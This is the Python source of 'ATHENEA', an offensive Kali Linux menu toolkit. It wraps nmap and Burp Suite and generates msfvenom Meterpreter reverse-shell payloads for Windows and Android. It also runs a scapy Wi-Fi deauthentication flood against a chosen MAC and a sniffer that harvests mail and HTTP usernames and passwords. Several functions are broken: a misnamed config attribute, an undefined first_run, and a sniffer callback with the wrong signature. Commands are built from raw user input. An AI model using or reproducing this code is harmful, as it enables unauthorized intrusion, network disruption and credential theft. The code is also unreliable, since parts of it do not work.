#!/usr/bin/python
# -*- encoding: utf-8 -*-

'''
ATHENEA 0.0.1a-3 toolkit 
Written by ringzer0
License: GPL2
'''
__author__ = 'ringzer0'
'''

Requirements: 
--> Python 2.7 interpreter
--> Scapy module

'''
'''

COLOR DEFINITIONS:

'''
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'






import os
import sys
import time
import random
from scapy.all import *
from subprocess import *
from scapy.layers.all import *
import logging
import atheneapscan
logging.basicConfig()
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
try:
    import config
    print(bcolors.OKGREEN+"[+] "+bcolors.OKBLUE+"Configuration file load properly! :D")
except ImportError as e:
    print(bcolors.FAIL+"[!]"+bcolors.WARNING+" Failed trying to load config file (if it's the first run, dont mind, if not, please report the bug): " + str(e)+bcolors.ENDC)


aps = {}




banner = ('''
     $$$$$$\ $$$$$$$$\ $$\   $$\ $$$$$$$$\ $$\   $$\ $$$$$$$$\  $$$$$$\  
    $$  __$$\ \_$$  __|$$ |  $$ |$$  _____|$$$\  $$ |$$  _____|$$  __$$\ 
    $$ /  $$ |  $$ |   $$ |  $$ |$$ |      $$$$\ $$ |$$ |      $$ /  $$ |
    $$$$$$$$ |  $$ |   $$$$$$$$ |$$$$$\    $$ $$\$$ |$$$$$\    $$$$$$$$ |
    $$  __$$ |  $$ |   $$  __$$ |$$  __|   $$ \$$$$ |$$  __|   $$  __$$ |
    $$ |  $$ |  $$ |   $$ |  $$ |$$ |      $$ |\$$$ |$$ |      $$ |  $$ |
    $$ |  $$ |  $$ |   $$ |  $$ |$$$$$$$$\ $$ | \$$ |$$$$$$$$\ $$ |  $$ |
    \__|  \__|  \__|   \__|  \__|\________|\__|  \__|\________|\__|  \__|                                                   
                {} Kali Linux toolkit
                            by: ringzer0

        ''').format(config.VERSION['version_latest'])

athenea = bcolors.OKBLUE + bcolors.BOLD + "[athenea~$] " 

def clear():
    os.system("clear")


def prog_check():
    try:
        print(bcolors.OKBLUE+"[+] Checking if nmap is installed...")
        p = subprocess.Popen(["nmap"], shell = True)
        p.terminate()
    except OSError as e:
        if e.errno == os.errno.ENOENT:
            print(bcolors.WARNING+"[!] Nmap not installed,"+bcolors.OKGREEN+" i'll do it for you")
            os.system('sudo apt install nmap')
        else:
            print("OK")
    try:
        print(bcolors.OKBLUE+"[+] Checking if Zenmap is installed...")
        p = subprocess.Popen(["zenmap"], shell = True)
        p.terminate()
    except OSError as e:
        if e.errno == os.errno.ENOENT:
            print(bcolors.WARNING+"[!] Zenmap not installed, i'll do it for you")
            os.system('sudo apt install zenmap')
        else:
            print("OK")
    try:
        print(bcolors.OKBLUE+"[+] Checking if nmap is installed...")
        p = subprocess.Popen(["netdiscover"], shell = True)
        p.terminate()
    except OSError as e:
        if e.errno == os.errno.ENOENT:
            print(bcolors.WARNING+"[!] Netdiscover not installed, i'll do it for you")
            os.system('sudo apt install netdiscover')
        else:
            print("OK")
    try:
        print(bcolors.OKBLUE+"[+] Checking if nmap is installed...")
        p = subprocess.Popen(["burpsuite"], shell = True)
        p.terminate()
    except OSError as e:
        if e.errno == os.errno.ENOENT:
            print(bcolors.WARNING+"[!] BurpSuite not installed, you can't use it, download from its website")
        else:
            print("OK")
    try:
        print(bcolors.OKBLUE+"[+] Checking if wash is installed...")
        p = subprocess.Popen(["wash"], shell = True)
        p.terminate()
    except OSError as e:
        if e.errno == os.errno.ENOENT:
            print(bcolors.WARNING+"[!] wash not installed, i'll do it for you")
            os.system('sudo apt install wash')
        else:
            print("OK")




class Athenea():
    def __init__(self):
        print(bcolors.HEADER+bcolors.BOLD+banner+bcolors.ENDC)
    def main_menu(self):
        print(bcolors.OKGREEN+'''
            [1]>> Information gathering
            [2]>> Vulnerability Analysis
            [3]>> Metasploit Payload Generator
            [4]>> Wireless Attacks
            [q]>> Quit
        '''+bcolors.ENDC)
        try:
            choice = raw_input(athenea)
            clear()
            if choice == "1":
                InfoGatheringMenu().menu()
            elif choice == "2":
                VulnAnMenu().vuln_anl_menu()
            elif choice == "3":
                MetasploitMenu().metasploit_menu()
            elif choice == "4":
                APScan().menu()
            elif choice == "q":
                print(bcolors.OKGREEN+"[*]"+bcolors.ENDC+" Thanks for using "+bcolors.OKBLUE+ "Athenea"+bcolors.ENDC+", and remember, "+bcolors.WARNING+bcolors.UNDERLINE+"control is an illusion ... "+bcolors.ENDC)
                sys.exit(0)
            else:
                print(bcolors.WARNING+bcolors.BOLD+"[W]: Option not recognized"+bcolors.ENDC)
                return main()

        except KeyboardInterrupt:
            print(bcolors.FAIL+bcolors.BOLD+"\n[+] User cancelled, exiting ... "+bcolors.ENDC)
class InfoGatheringMenu():
    def menu(self):
        print('''
        === INFORMATION GATHERING ===
            [1]>> Nmap.
            [2]>> Netdiscover.
            [99]>> Return to main menu.
            [q]>> Quit
        ''')
        try:
            choice = raw_input(athenea)
            if choice == "1":
                clear()
                Nmap().nmapMenu()
            elif choice == "2":
                Netdiscover().netdiscover()
            elif choice == "99":
                clear()
                Athenea().main_menu()
            elif choice == "q":
                print("[*] Thanks for using "+bcolors.OKBLUE+ "Athenea"+bcolors.ENDC+", and remember, "+bcolors.WARNING+bcolors.UNDERLINE+"control is an illusion ... "+bcolors.ENDC)
                sys.exit(0)
            else:
                clear()
                print(bcolors.WARNING+bcolors.BOLD+"[W]: Option not recognized."+bcolors.ENDC)
                return InfoGatheringMenu().menu()
        except KeyboardInterrupt:
            print(bcolors.FAIL+bcolors.BOLD+"\n[+] User cancelled, exiting ... "+bcolors.ENDC)
class Nmap():
    def __init__(self):
        self.target_prompt = athenea +bcolors.OKGREEN+":nmap>"+bcolors.ENDC+" Enter the target to scan: "
    def nmapMenu(self):
        print('''
        === NMAP MENU ===
            [1]>> SYN Scan
            [2]>> TCP SYN/Connect scan
            [3]>> ACK scan
            [4]>> Launch Zenmap
            [99]>> Return to InfoGathering Menu
        ''')
        try:
            choice = raw_input(athenea+bcolors.OKGREEN+":nmap> "+bcolors.ENDC)
            if choice == "1":
                clear()
                self.run_syn()
            elif choice == "2":
                clear()
                self.run_tcp()
            elif choice == "3":
                clear()
                self.run_ack()
            elif choice == "4":
                clear()
                os.system("sudo zenmap")
                return main()
            elif choice == "99":
                clear()
                InfoGatheringMenu().menu()
            elif choice == "q":
                sys.exit(0)
            else:
                clear()
                print(bcolors.WARNING+bcolors.BOLD+"[W]: Option not recognized."+bcolors.ENDC)
                return Nmap().nmapMenu()
        except KeyboardInterrupt:
            print(bcolors.FAIL+bcolors.BOLD+"[!] User cancelled, exiting ... "+bcolors.ENDC)    
    def run_ack(self):
        target = raw_input(self.target_prompt)
        os.system("nmap -sA -v " + target)
        return main()
    def run_tcp(self):
        target = raw_input(self.target_prompt)
        os.system("nmap -sT -v " + target)
        return main()
    def run_syn(self):
        target = raw_input(self.target_prompt)
        os.system("nmap -sS -v " + target)
        return main()


class Netdiscover():
    def __init__(self):
        print("[*] Initializing NetDiscover ...")
    def netdiscover(self):
        os.system("netdiscover")
        return main()

    

class VulnAnMenu():
    def __init__(self):
        self.athenea_vuln = athenea+bcolors.OKGREEN+":VulnerabilityAnalysis> "+bcolors.ENDC
    def vuln_anl_menu(self):
        print('''
           === Vulnerability Analysis ===
               [1]>> BurpSuite
               [99]>> Back to main menu
               [q]>> Quit
            ''')
        try:

            option = raw_input(self.athenea_vuln)
            if option == "1":
                VulnerabilityAnalysis().burpsuite()
                return main()
            elif option == "99":
                clear()
                return main()
            elif option == "q":
                print("[*] Thanks for using "+bcolors.OKBLUE+ "Athenea"+bcolors.ENDC+", and remember, "+bcolors.WARNING+bcolors.UNDERLINE+"control is an illusion ... "+bcolors.ENDC)
                sys.exit(0)
            else:
                clear()
                print(bcolors.WARNING+bcolors.BOLD+"[W]: Option not recognized."+bcolors.ENDC)
                VulnAnMenu().vuln_anl_menu()
        except KeyboardInterrupt:
            print(bcolors.FAIL+bcolors.BOLD+"[!] User cancelled, exiting ... "+bcolors.ENDC)
class VulnerabilityAnalysis():
    def __init__(self):
        return
    def burpsuite(self):
        print(bcolors.OKGREEN+bcolors.BOLD+"[*] Initializing BurpSuite ... "+bcolors.ENDC)
        os.system("burpsuite")



class MetasploitMenu():
    def __init__(self):
        self.metasploit_prompt = athenea+bcolors.OKGREEN+":metasploit> "+bcolors.ENDC
        print("[*] Wait for it...")
    def metasploit_menu(self):
        print('''
        === Metasploit Payload Generator ===
            [1]>> Windows reverse_tcp x86
            [2]>> Windows reverse_tcp x64
            [3]>> Android reverse_tcp (dalvik)
            [99]>> Return to main menu
            [q]>> Quit
            ''')
        try:
            option = raw_input(self.metasploit_prompt)
            if option == "1":
                MetasploitExploiting().exploit_gen_win()
                return main()
            elif option == "2":
                MetasploitExploiting().exploit_gen_win_x64()
                return main()
            elif option == "3":
                MetasploitExploiting().exploit_gen_android()
                return main()
            elif option == "99":
                clear()
                Athenea().main_menu()
            elif option == "q":
                print("[*] Thanks for using "+bcolors.OKBLUE+ "Athenea"+bcolors.ENDC+", and remember, "+bcolors.WARNING+bcolors.UNDERLINE+"control is an illusion ... "+bcolors.ENDC)
                sys.exit(0)
            else:
                clear()
                print(bcolors.WARNING+bcolors.BOLD+"[W]: Option not recognized."+bcolors.ENDC)
                self.metasploit_menu()
        except KeyboardInterrupt:
            print(bcolors.FAIL+bcolors.BOLD+"[!] User cancelled, exiting ... "+bcolors.ENDC)
            sys.exit(0)
class MetasploitExploiting():
    def __init__(self):
        print("[*] Wait for it ...")
        clear()
    def exploit_gen_win(self):
        LHOST = raw_input(bcolors.OKGREEN+bcolors.BOLD+"[+] Please enter your LHOST for the reverse shell: "+bcolors.ENDC)
        LPORT = raw_input(bcolors.OKGREEN+bcolors.BOLD+"[+] Please enter your LPORT for the reverse shell: "+bcolors.ENDC)
        total = 1000
        i = 0
        while i < total:
            progress(i, total, status = bcolors.BOLD+bcolors.OKGREEN+'\n[*] Generating payload... Wait for it...'+bcolors.ENDC)
            i+=1
            sys.stdout.write("\033[K")
        print(bcolors.OKGREEN+"[+] Wait a sec..."+bcolors.ENDC)
        os.system("sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+"> payload.exe")
    
    def exploit_gen_win_x64(self):
        LHOST = raw_input("Please enter your LHOST for the reverse shell: ")
        LPORT = raw_input("Please enter your LPORT for the reverse shell: ")
        total = 1000
        i = 0
        while i < total:
            progress(i, total, status = bcolors.BOLD+bcolors.OKGREEN+'\n[*] Generating payload... Wait for it...'+bcolors.ENDC)
            i+=1
            sys.stdout.write("\033[K")
        print(bcolors.OKGREEN+bcolors.BOLD+"[+] Wait a sec..."+bcolors.ENDC)
        os.system("sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+"> payload.exe")

    def exploit_gen_android(self):
        LHOST = raw_input("Please enter your LHOST for the reverse shell: ")
        LPORT = raw_input("Please enter your LPORT for the reverse shell: ")
        total = 1000
        i = 0
        while i < total:
            progress(i, total, status = '\n[*] Generating payload... Wait for it...')
            i+=1
            sys.stdout.write("\033[K")
        print(bcolors.OKGREEN+bcolors.BOLD+"[+] Wait a sec..."+bcolors.ENDC)
        os.system("sudo msfvenom -p android/meterpreter/reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+"> payload.apk")


class APScan(object):
    def menu(self):
        print('''
            === Wireless Attacks ===
                [1]>> Athenea AP scan tool with PCAP file write
                [2]>> Athenea AP scan tool (only lists APs)
                [3]>> Hexdump & Summaries of PCAP files (in script root dir)
                [4]>> Run Wash to scan WPS
                [5]>> Athenea Deauth Tool
                [6]>> Start Airmon-Ng
                [7]>> Stop Airmon-Ng [!](NEVER EVER do it when already deactivated)
                [8]>> Email Credential Harvester
                [q]>> Cleanup and quit
            ''')
        
        prompt = raw_input(athenea+bcolors.OKGREEN+":wireless> "+bcolors.ENDC)
        if prompt == "1":
            os.system('python atheneapscan.py -s')
            self.menu() 
        elif prompt == "2":
            atheneapscan.main()
            self.menu()
        elif prompt == "3":
            hexdump_pcap()
        elif prompt == "5":
            RadioTap().deauth()
            self.menu()
        elif prompt == "6":
            run_airmon()
            self.menu()
        elif prompt == "7":
            remove_mon_iface()
            self.menu()
        elif prompt == "8":
            email_creds()
            self.menu()
        elif prompt == "q":
            print(bcolors.OKBLUE+"[+] Exiting, bye! (remember to quit monitor mode D:) :D")
        else:
            print(bcolors.WARNING+bcolors.BOLD+"[W]: Option not recognized")
            APScan().menu()


def run_airmon():
    try:
        print(bcolors.OKGREEN+'[*]  Starting monitor mode on '+config.Wireless.IFACE+bcolors.ENDC)
        os.system('airmon-ng check kill')
        os.system('airmon-ng start '+config.WIRELESS['IFACE'])
        IS_MON = True
    except Exception:
        sys.exit(bcolors.FAIL+'[-] Could not start monitor mode'+bcolors.ENDC)
def remove_mon_iface():
    try:
        print(bcolors.WARNING+'[*]  Stopping monitor mode on '+config.Wireless.MON_IFACE+bcolors.ENDC)
        os.system('airmon-ng stop '+config.WIRELESS['MON_IFACE'])
    except Exception, e:
        sys.exit("[!] Something went wrong, ERRID: ", str(e))

def hexdump_pcap():
    pcap = rdpcap('capture.pcap')
    pcap.summary()
    os.system("hexdump -C capture.pcap")




def email_creds(self, packet):
    # check to make sure it has a data payload

    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
            print '[*] Server: %s' % packet[IP].dst
            print '[*] %s' %packet[TCP].payload
    try:        
        sniff(filter="tcp port 110 or tcp port 25 or tcp port 143 or tcp port 80 or tcp port 8080", prn=email_creds, store=0)
    except:
        print("[!] Something failed")





class RadioTap(object):
    def deauth(self):
        iface = config.Wireless.IFACE
        brdmac = 'ff:ff:ff:ff:ff:ff'
        dstmac = raw_input("[*] Enter the target: ")
        pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = dstmac, addr3 = dstmac) / Dot11Deauth()

        sendp(pkt, iface = iface, count = 1000000, inter = .2)
    
    def pcap_read(self):
        return
        '''
        TODO: Implement pcap parsing
        '''
    
    def three_way(self):
        return
        '''
        TODO: Implement three way handshake
        '''



def progress(count, total, status=''):
    bar_len = 60
    filled_len = int(round(bar_len * count / float(total)))

    percents = round(100.1 * count / float(total), 1)
    bar = '#' * filled_len + '-' * (bar_len - filled_len)

    sys.stdout.write('\r[%s] %s%s ...%s\r' % (bar, percents, '%', status))
    sys.stdout.flush()
    clear()


def main():
    try:
        athenea = Athenea().main_menu()
    except KeyboardInterrupt:
        print(bcolors.OKBLUE+bcolors.BOLD+"[+] Cleanup and exiting..."+bcolors.ENDC)


if __name__ == '__main__':

    if os.geteuid():
        sys.exit(bcolors.FAIL+'[-] Please run as root'+bcolors.ENDC)
    if not os.path.isfile('config.py'):
        interface = raw_input(bcolors.OKGREEN+"[+] Please enter your wifi interface (in managed mode): ")
        mon_iface = raw_input(bcolors.OKGREEN+"[+] Please enter your monitor mode interface[should be wlan0mon]: ")
        gateway   = raw_input(bcolors.OKGREEN+"[+] Please enter your GATEWAY IP(maybe 192.168.1.1): ")
        with open('config.py', 'wb') as cfg:
            cfg.write(str("WIRELESS = {\r\n"))
            cfg.write("\t""\'IFACE\' : \'"+str(interface)+"\',\r\n")
            cfg.write("\t""\'MON_IFACE\' : \'"+str(mon_iface)+"\',\r\n")
            cfg.write("\t""\'GATEWAY\' : \'"+str(gateway)+"\'}\r\n")
            cfg.write(str("VERSION = {\r\n"))
            cfg.write("\t""\'version_latest\' : \'ATHENEA 0.0.3b-rc72\'}\r\n")
            cfg.close()
        main()
    elif os.path.isfile('config.py'):
        prog_check()
        main()
    else:
        first_run()


    
